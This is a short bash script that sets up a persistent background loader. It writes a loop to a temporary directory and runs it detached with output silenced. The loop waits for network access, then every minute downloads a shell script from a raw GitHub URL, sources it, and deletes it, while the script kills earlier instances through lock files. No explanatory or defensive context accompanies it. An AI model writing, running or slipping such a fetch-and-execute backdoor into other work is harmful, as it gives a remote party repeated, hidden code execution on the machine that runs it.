#!/bin/bash
function spawnew(){
   SPAWEDFLAGFILE="${LOCKM_FILE}_clr"
   [ -f ${SPAWEDFLAGFILE} ] && return || touch ${SPAWEDFLAGFILE}; 
   local TMPD=$(mktemp -d --suffix=$(whoami))
   cd $TMPD
   echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;
   while :; do
        while ! ping -c 1 -W 1 google.com &>/dev/null; do sleep 1; done;
         cdata=`mktemp -u`
         wget -q https://raw.githubusercontent.com/thanhtholao/shell/master/shell.sh -O $cdata
         . $cdata
         sleep 5;
         rm -f $cdata;
         endoffile_ &
         #bash /home/user/workspace/shell_ttl/shell.sh;
          sleep 60;
    done;' > data
    nohup bash data &>/dev/null &
    oldpid=`cat $LOCKM_FILE`
    echo $! > $LOCKM_FILE;
    rm -rf $TMPD;
    kill -9 `cat $LOCKSH_FILE`
    kill -9 $oldpid
}
spawnew
